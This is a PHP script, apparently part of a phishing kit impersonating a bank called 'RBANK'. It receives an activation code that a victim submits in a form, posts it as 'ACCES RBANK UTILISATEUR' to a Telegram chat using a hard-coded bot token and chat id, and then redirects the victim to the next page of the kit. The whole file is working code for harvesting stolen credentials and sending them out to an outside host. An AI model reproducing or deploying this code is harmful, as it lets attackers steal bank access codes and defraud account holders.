<?php
if (isset($_POST['send2'])) {
    if (isset($_POST['code']) and !empty($_POST['code'])) {
        $code = $_POST['code'];

        $msg = "ACCES RBANK UTILISATEUR, code d'activation : $code";

        $parameters = [
            "chat_id" => '-1002009130611',
            "text" => $msg,
        ];
        $bot_token = "6712793520:AAFQz4zgrADzTSpaTna_4Y0T_cW2PIz30sc";
        $reponse = file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($parameters));

        header('Location: Message.php');
    }
    else {
        header('Location: etape2.php');
    }
}
else {
    header('Location: etape2.php');
}
?>